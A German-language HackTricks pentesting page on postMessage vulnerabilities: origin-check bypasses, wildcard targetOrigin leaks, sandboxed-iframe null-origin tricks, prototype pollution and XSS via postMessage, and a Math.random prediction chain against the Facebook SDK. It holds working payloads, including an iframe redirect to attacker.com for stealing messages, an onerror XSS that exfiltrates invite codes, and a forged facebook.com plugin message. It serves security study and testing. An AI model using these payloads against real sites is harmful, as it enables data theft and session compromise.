# PostMessage Schwachstellen

{{#include ../../banners/hacktricks-training.md}}

## Senden von **PostMessage**

**PostMessage** verwendet die folgende Funktion, um eine Nachricht zu senden:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachte, dass **targetOrigin** '\*' oder eine URL wie _https://company.com._ sein kann.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (selbst wenn die origin des Window object unterschiedlich ist).\
Wenn die **wildcard** verwendet wird, **könnten Nachrichten an jede Domain gesendet werden**, und sie werden an die origin des Window object gesendet.

### Angriff auf iframe & wildcard in **targetOrigin**

Wie in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erklärt, wenn du eine Seite findest, die **iframed** werden kann (kein `X-Frame-Header` Schutz) und die **sensitive** Nachrichten via **postMessage** mit einem **wildcard** (\*) sendet, kannst du die **origin** des **iframe** ändern und die **sensitive** Nachricht an eine von dir kontrollierte Domain leak.\
Beachte, dass wenn die Seite iframed werden kann, aber **targetOrigin** **auf eine URL und nicht auf ein wildcard gesetzt ist**, dieser **Trick nicht funktionieren wird**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener Ausnutzung

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages` erwartet**.\
Ein Code ähnlich dem folgenden wird verwendet:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Beachte in diesem Fall, wie das **erste**, was der Code tut, **die Überprüfung des origin** ist. Das ist extrem **wichtig**, besonders wenn die Seite irgendetwas Sensitives mit den empfangenen Informationen macht (z. B. ein Passwort ändern). **Wenn sie den origin nicht prüft, können Angreifer Opfer dazu bringen, beliebige Daten an diese endpoints zu senden** und die Passwörter der Opfer zu ändern (in diesem Beispiel).

### Enumeration

Um **event listeners** in der aktuellen Seite zu finden, kannst du:

- **Search** den JS-Code nach `window.addEventListener` und `$(window).on` (_JQuery version_)
- **Execute** in der Developer Tools Console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in den Developer Tools des Browsers

![](<../../images/image (396).png>)

- Verwende eine **browser extension** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese browser extensions werden **alle Messages abfangen** und dir anzeigen.

### Origin check bypasses

- Das Attribut **`event.isTrusted`** gilt als sicher, da es `True` nur für Events zurückgibt, die durch echte Nutzeraktionen erzeugt wurden. Obwohl es schwer zu umgehen ist, wenn korrekt implementiert, ist seine Bedeutung für Sicherheitschecks bemerkenswert.
- Die Verwendung von **`indexOf()`** zur origin-Validierung bei PostMessage-Events kann umgangen werden. Ein Beispiel, das diese Schwachstelle zeigt, ist:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`**-Methode von `String.prototype.search()` ist für reguläre Ausdrücke gedacht, nicht für Strings. Wird etwas anderes als ein RegExp übergeben, erfolgt eine implizite Konvertierung zu einem Regex, was die Methode potenziell unsicher macht. In Regex fungiert ein Punkt (.) als Wildcard, wodurch Validierungen mit speziell konstruierten Domains umgangen werden können. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`**-Funktion arbeitet ähnlich wie `search()` mit Regex. Ist der Regex schlecht aufgebaut, kann auch hier ein Bypass möglich sein.
- Die Funktion **`escapeHtml`** soll Eingaben durch Escapen von Zeichen säubern. Sie erzeugt jedoch kein neues escaped-Objekt, sondern überschreibt die Eigenschaften des bestehenden Objekts. Dieses Verhalten kann ausgenutzt werden. Insbesondere wenn ein Objekt so manipuliert werden kann, dass seine kontrollierte Eigenschaft `hasOwnProperty` nicht erkennt, führt `escapeHtml` nicht die erwartete Sanitization durch. Das wird in den folgenden Beispielen demonstriert:

- Erwartetes Fehlschlagen:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Umgehung des Escapes:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Im Kontext dieser Schwachstelle ist das `File`-Objekt besonders ausnutzbar, da seine `name`-Property read-only ist. Diese Property wird in Templates verwendet und von `escapeHtml` nicht gesäubert, was zu potenziellen Sicherheitsrisiken führt.

- Die `document.domain`-Property in JavaScript kann von einem Script gesetzt werden, um die Domain zu verkürzen, was eine lockerere Same-Origin-Policy innerhalb derselben Parent-Domain ermöglicht.

### e.origin == window.origin bypass

Beim Einbetten einer Webseite in ein **sandboxed iframe** mithilfe von %%%%%% ist es wichtig zu wissen, dass der origin des iframes auf null gesetzt wird. Das ist besonders relevant im Zusammenhang mit **sandbox attributes** und deren Auswirkungen auf Sicherheit und Funktionalität.

Wenn in den sandbox-Attributen **`allow-popups`** angegeben wird, erben alle aus dem iframe geöffneten Popups die Sandbox-Einschränkungen des Parents. Das bedeutet, dass sofern nicht auch das Attribut **`allow-popups-to-escape-sandbox`** gesetzt ist, der origin des Popup-Fensters ebenfalls auf `null` gesetzt wird, also dem origin des iframes entspricht.

Folglich, wenn ein Popup unter diesen Bedingungen geöffnet wird und eine Nachricht vom iframe an das Popup mittels **`postMessage`** gesendet wird, haben Sender und Empfänger beide ihren origin auf `null` gesetzt. Das führt zu einer Situation, in der **`e.origin == window.origin`** true ergibt (`null == null`), da sowohl iframe als auch Popup denselben origin-Wert `null` teilen.

Für weitere Informationen **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Es ist möglich zu prüfen, ob die Message vom selben Window stammt, in dem das Script lauscht (besonders interessant für **Content Scripts from browser extensions**, um zu prüfen, ob die Message von derselben Seite gesendet wurde):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Du kannst den **`e.source`** einer Nachricht auf null setzen, indem du ein **iframe** erstellst, das die **postMessage** **sendet** und **sofort gelöscht** wird.

Für mehr Informationen **lies:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Um diese Angriffe durchzuführen solltest du idealerweise die **Opfer-Webseite** innerhalb eines `iframe` platzieren können. Aber manche Header wie `X-Frame-Header` können dieses **Verhalten** **verhindern**.\
In solchen Szenarien kannst du trotzdem einen weniger unauffälligen Angriff verwenden. Du kannst einen neuen Tab zur verwundbaren Webanwendung öffnen und mit ihr kommunizieren:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Nachricht an child iframe stehlen, indem man die main page blockiert

Auf der folgenden Seite siehst du, wie du **sensitive postmessage data**, die an ein **child iframe** gesendet wird, stehlen kannst, indem du die **main** page vor dem Senden der Daten blockierst und eine **XSS im child** ausnutzt, um die Daten **leak the data** bevor sie empfangen werden:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Nachricht stehlen durch Ändern der iframe location

Wenn du eine Webseite ohne X-Frame-Header in ein iframe einbetten kannst, die ein weiteres iframe enthält, kannst du die location dieses child iframe ändern. Wenn es also eine **postmessage** empfängt, die mit einem **wildcard** gesendet wurde, könnte ein Angreifer die **origin** dieses iframe auf eine von ihm **controlled** Seite ändern und die Nachricht **stehlen**:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die über `postMessage` gesendeten Daten von JS ausgeführt werden, kannst du die Seite iframen und die **prototype pollution/XSS** ausnutzen, indem du den Exploit via `postMessage` sendest.

Ein sehr gut erklärtes Beispiel für XSS durch `postMessage` findet sich unter [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Beispiel für einen Exploit, um **Prototype Pollution und anschließend XSS** über eine `postMessage` an ein `iframe` auszunutzen:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Für **weitere Informationen**:

- Link zur Seite über [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link zur Seite über [**XSS**](../xss-cross-site-scripting/index.html)
- Link zur Seite über [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Vorhersage von **`Math.random()`** Callback-Tokens in postMessage bridges

Wenn die Nachrichtenvalidierung ein „shared secret“ verwendet, das mit `Math.random()` erzeugt wird (z. B. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) und derselbe Helfer auch Plugin-iframes benennt, kannst du PRNG-Ausgaben rekonstruieren und vertrauenswürdige Nachrichten fälschen:

- **Leak PRNG outputs via `window.name`:** Das SDK benennt Plugin-iframes automatisch mit `guid()`. Wenn du den Top-Frame kontrollierst, iframe die Opferseite, navigiere dann das Plugin-iframe zu deiner Origin (z. B. `window.frames[0].frames[0].location='https://attacker.com'`) und lies `window.frames[0].frames[0].name`, um einen rohen `Math.random()`-Output zu erhalten.
- **Force more outputs without reloads:** Einige SDKs bieten einen reinit-Pfad; im FB SDK erzwingt das Feuern von `init:post` mit `{xfbml:1}` `XFBML.parse()`, zerstört/erstellt das Plugin-iframe neu und generiert neue Namen/Callback-IDs. Wiederholtes Reinit erzeugt so viele PRNG-Ausgaben wie nötig (Achtung: zusätzliche interne `Math.random()`-Aufrufe für Callback-/iframe-IDs, daher müssen Solver die dazwischenliegenden Werte überspringen).
- **Trusted-origin delivery via parameter pollution:** Wenn ein first-party Plugin-Endpunkt einen nicht bereinigten Parameter in die cross-window Payload reflektiert (z. B. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kannst du `&type=...&iconSVG=...` injizieren und dabei die vertrauenswürdige `facebook.com` Origin beibehalten.
- **Predict the next callback:** Wandle leaked iframe-Namen zurück in Floats in [0,1) und füttere mehrere Werte (auch nicht-aufeinanderfolgende) in einen V8 `Math.random` Predictor (z. B. Z3-basiert). Erzeuge lokal das nächste `guid()`, um das erwartete Callback-Token zu fälschen.
- **Trigger the sink:** Konstruiere die postMessage-Daten so, dass die Bridge `xd.mpn.setupIconIframe` dispatcht und HTML in `iconSVG` injiziert (z. B. URL-encodiertes `<img src=x onerror=...>`), wodurch DOM XSS innerhalb der Hosting-Origin erreicht wird; von dort können same-origin iframes (OAuth-Dialogs, arbiters, etc.) ausgelesen werden.
- **Framing quirks help:** Die Kette erfordert Framing. In einigen mobilen Webviews kann `X-Frame-Options` zu dem nicht unterstützten `ALLOW-FROM` degradieren, wenn `frame-ancestors` vorhanden ist, und “compat”-Parameter können permissive `frame-ancestors` erzwingen, was den `window.name` side channel ermöglicht.

#### Minimales gefälschtes Message-Beispiel
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referenzen

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Zum Üben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
